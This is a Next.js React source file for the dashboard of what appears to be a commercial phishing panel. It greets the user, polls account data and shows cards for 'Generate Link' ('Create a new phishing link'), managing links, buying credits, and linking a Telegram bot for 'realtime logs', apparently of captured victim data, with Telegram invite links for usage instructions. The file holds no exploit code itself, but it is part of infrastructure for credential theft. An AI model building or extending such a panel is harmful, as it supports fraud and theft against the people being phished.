'use client';

import { useSession } from 'next-auth/react';
import { useRouter } from 'next/navigation';
import { 
  CreditCardIcon,
  LinkIcon,
  ChartBarIcon,
  ArrowTrendingUpIcon,
  ClockIcon,
  Cog6ToothIcon,
  UserIcon,
  PlusIcon,
  CheckCircleIcon,
  ExclamationCircleIcon,
  ArrowTopRightOnSquareIcon
} from '@heroicons/react/24/outline';
import Link from 'next/link';
import { useEffect, useState, useCallback, useRef } from 'react';

interface UserData {
  username: string;
  points: number;
  telegramId?: string;
}

interface StatCard {
  title: string;
  value: string | number;
  icon: React.ForwardRefExoticComponent<any>;
  change?: string;
  trend?: 'up' | 'down' | 'neutral';
}

export default function DashboardPage() {
  const { data: session } = useSession();
  const [userData, setUserData] = useState<UserData | null>(null);
  const abortControllerRef = useRef<AbortController | null>(null);
  const pollingTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  const getUser = useCallback(async () => {
    if (abortControllerRef.current) {
      abortControllerRef.current.abort();
    }

    abortControllerRef.current = new AbortController();

    try {
      const response = await fetch('/api/auth/user', {
        signal: abortControllerRef.current.signal,
        headers: {
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });

      if (!response.ok) {
        throw new Error('Failed to fetch user data');
      }

      const data = await response.json();
      
      if (data.user) {
        setUserData({
          username: data.user.username,
          points: data.user.points,
          telegramId: data.user.telegramId,
        });
      }
    } catch (error) {
      if (error instanceof Error && error.name !== 'AbortError') {
        console.error('Error fetching user data:', error);
      }
    }
  }, []);

  useEffect(() => {
    if (!session?.user) return;

    getUser();

    const pollData = () => {
      pollingTimeoutRef.current = setTimeout(() => {
        getUser();
        pollData();
      }, 10000);
    };

    pollData();

    return () => {
      if (abortControllerRef.current) {
        abortControllerRef.current.abort();
      }
      if (pollingTimeoutRef.current) {
        clearTimeout(pollingTimeoutRef.current);
      }
    };
  }, [session, getUser]);

  if (!userData) {
    return (
      <div className="flex justify-center items-center min-h-[50vh]">
        <div className="w-8 h-8 border-4 border-primary-500 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  const quickLinks = [
    {
      name: 'Generate Link',
      description: 'Create a new phishing link',
      icon: PlusIcon,
      href: '/generate',
      color: 'text-blue-500'
    },
    {
      name: 'My Links',
      description: 'View and manage your links',
      icon: LinkIcon,
      href: '/links',
      color: 'text-purple-500'
    },
    {
      name: 'Buy Credits',
      description: 'Top up your balance',
      icon: CreditCardIcon,
      href: '/buy',
      color: 'text-green-500'
    },
    {
      name: 'Settings',
      description: 'Manage your preferences',
      icon: Cog6ToothIcon,
      href: '/settings',
      color: 'text-gray-500'
    }
  ];

  return (
    <div className="space-y-8">
      {/* Welcome Section */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-gray-900 dark:text-white">
            Welcome back, <span className='capitalize'>{userData.username || 'User'}</span>
          </h1>
        </div>
        <Link
          href="/profile"
          className="flex items-center px-4 py-2 text-sm font-medium text-gray-700 dark:text-gray-200 bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700/50 transition-colors"
        >
          <UserIcon className="h-5 w-5 mr-2" />
          View Profile
        </Link>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        {/* Required Actions */}
        <div className="lg:col-span-4 space-y-6">
          <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
            Required Actions
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
            <Link
              href="/connect-telegram"
              className={`flex items-center p-4 bg-white dark:bg-gray-800 rounded-xl border ${
                userData.telegramId ? 'border-green-500' : 'border-red-500'
              } hover:border-blue-500 dark:hover:border-blue-500 transition-colors`}
            >
              <div className="flex-1">
                <h3 className="text-sm font-medium text-gray-900 dark:text-white">
                  Connect Telegram Bot
                </h3>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  Connect to UST Telegram bot for realtime logs
                </p>
              </div>
              {userData.telegramId ? (
                <CheckCircleIcon className="h-5 w-5 text-green-500" />
              ) : (
                <ExclamationCircleIcon className="h-5 w-5 text-red-500" />
              )}
            </Link>

            <Link
              href="https://t.me/+VoV4GcwY4KtjZmI8"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center p-4 bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 hover:border-blue-500 dark:hover:border-blue-500 transition-colors"
            >
              <div className="flex-1">
                <h3 className="text-sm font-medium text-gray-900 dark:text-white">
                  How to Use this site
                </h3>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  Click here to learn how to use it.
                </p>
              </div>
              <ArrowTopRightOnSquareIcon className="h-5 w-5 text-gray-400" />
            </Link>

            <Link
              href="https://t.me/+MuFvi512b7NiMWI0"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center p-4 bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 hover:border-blue-500 dark:hover:border-blue-500 transition-colors"
            >
              <div className="flex-1">
                <h3 className="text-sm font-medium text-gray-900 dark:text-white">
                  Check for Updates
                </h3>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  Get latest updates and information
                </p>
              </div>
              <ArrowTopRightOnSquareIcon className="h-5 w-5 text-gray-400" />
            </Link>
          </div>
        </div>

        {/* Quick Actions */}
        <div className="lg:col-span-4 space-y-6">
          <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
            Quick Actions
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
            {quickLinks.map((item, index) => (
              <Link
                key={index}
                href={item.href}
                className="group p-6 bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 hover:border-blue-500 dark:hover:border-blue-500 transition-colors"
              >
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="text-sm font-semibold text-gray-900 dark:text-white group-hover:text-blue-500 transition-colors">
                      {item.name}
                    </h3>
                    <p className="mt-1 text-sm text-gray-500 dark:text-gray-400">
                      {item.description}
                    </p>
                  </div>
                  <item.icon className={`h-6 w-6 ${item.color}`} />
                </div>
              </Link>
            ))}
          </div>
        </div>

      </div>
    </div>
  );
}